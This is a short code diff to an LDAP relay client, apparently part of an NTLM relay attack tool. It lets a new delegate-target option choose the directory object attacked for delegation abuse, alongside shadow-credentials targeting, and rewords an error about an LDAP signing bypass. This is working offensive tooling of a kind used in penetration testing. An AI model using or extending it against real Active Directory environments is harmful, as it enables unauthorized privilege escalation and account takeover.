@@ -478,10 +478,12 @@ class LDAPRelayClient(ProtocolClient):
         authMessage.fromString(token)
         victim = self.victimName(authMessage)
 
-        # Target the relayed principal, or the --shadow-target object (a full DN skips the lookup, so an anonymous base session needs no read)
+        # Target the relayed principal, or the --shadow-target / --delegate-target object (a full DN skips the lookup, so an anonymous base session needs no read)
         target = self.victimSam(authMessage)
         if self.serverConfig.IsShadowCredentialsAttack and self.serverConfig.ShadowCredentialsTarget:
             target = self.serverConfig.ShadowCredentialsTarget
+        elif self.serverConfig.delegateaccess and self.serverConfig.delegatetarget:
+            target = self.serverConfig.delegatetarget
 
         try:
             if '=' in target:
@@ -492,7 +494,7 @@ class LDAPRelayClient(ProtocolClient):
                 entry = self.bypassLookup(sam, ['distinguishedName'])
                 if entry is None:
                     LOG.error('LDAP signing bypass: could not resolve %s in the directory '
-                              '(an anonymous base session cannot search; pass --shadow-target as a full DN)', sam)
+                              '(an anonymous base session cannot search; pass the target as a full DN via --shadow-target or --delegate-target)', sam)
                     return None, STATUS_ACCESS_DENIED
                 self.targetDN = str(entry['objectName'])
                 self.targetSam = sam
